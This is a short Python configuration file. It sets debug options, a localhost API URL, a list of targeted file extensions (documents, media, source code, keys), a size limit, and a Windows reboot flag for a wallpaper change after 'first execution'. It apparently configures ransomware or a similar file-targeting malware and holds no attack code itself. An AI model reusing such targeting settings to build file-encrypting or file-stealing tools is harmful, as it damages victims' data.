import logging

DEBUG_MODE = True
LOG_LEVEL = logging.DEBUG
API_URL = "http://localhost:8080"

FILE_TYPES = ['py', 'cpp', 'js', 'doc', 'docx', 'pdf', 'mp3', 'wav',
              'mp4', 'txt', 'log', 'html', 'jpg', 'jpeg', 'gif', 'png', 'tga',
              'flv', 'wmv', 'mpeg', 'mov', 'json', 'key', 'xml', 'htm',
              'fb2', 'sxw', 'oxps', 'odt', 'ps', 'rtf', 'wpd', 'wp', 'wp7',
              'md', 'sh', 'MOV', 'JPG'
              ]

MAX_SIZE_LIMIT = 1.25

#if we should reboot on windows after first execution
#for wallpaper change
WIN_SHOULD_REBOOT = False